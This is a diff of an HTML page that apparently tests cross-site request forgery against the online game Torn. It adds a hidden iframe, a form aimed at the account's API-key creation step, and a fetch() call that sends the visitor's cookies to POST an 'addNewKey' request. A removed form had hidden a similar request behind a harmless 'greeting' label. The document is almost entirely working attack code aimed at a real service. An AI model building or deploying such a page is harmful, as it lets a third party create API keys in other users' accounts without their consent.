@@ -1,6 +1,8 @@
+<!---https://www.torn.com/preferences.php#tab=api?&step=addNewKey&title=Public%20only%20key&type=1-->
+
 <iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
 
-<form action="https://www.torn.com/bazaar.php" method="GET" target="dummyframe">
+<!--form action="https://www.torn.com/bazaar.php" method="GET" target="dummyframe">
   <div>
     <label for="sid">What greeting do you want to say?</label>
     <input name="sid" id="sid" value="bazaarData">
@@ -12,6 +14,24 @@
   <div>
     <button>Send my greetings</button>
   </div>
+</form-->
+
+<form action="https://www.torn.com/preferences.php#tab=api" method="GET" target="dummyframe">
+  <div>
+    <label for="step">step?</label>
+    <input name="step" id="step" value="addNewKey">
+  </div>
+  <div>
+    <label for="title">title?</label>
+    <input name="title" id="title" value="ppp">
+  </div>
+  <div>
+    <label for="type">type?</label>
+    <input name="type" id="type" value="1">
+  </div>
+  <div>
+    <button>Create</button>
+  </div>
 </form>
 
 <button onclick="doF()">Fetch</button>
@@ -20,7 +40,7 @@
 
 <script>
 async function doF() {
-await fetch("https://www.torn.com/page.php?sid=apiData", {
+const r = await fetch("https://www.torn.com/page.php?sid=apiData", {
     "credentials": "include",
     "headers": {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
@@ -32,10 +52,12 @@ await fetch("https://www.torn.com/page.php?sid=apiData", {
         "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-origin"
     },
+	redirect: 'follow',
     "referrer": "https://www.torn.com/preferences.php",
     "body": "-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"step\"\r\n\r\naddNewKey\r\n-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"\"\r\n\r\nundefined\r\n-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nPublic%20only%20key\r\n-----------------------------272245983515491098933614651682\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\n1\r\n-----------------------------272245983515491098933614651682--\r\n",
     "method": "POST",
     "mode": "cors"
 });
+console.log(r);
 }
 </script>
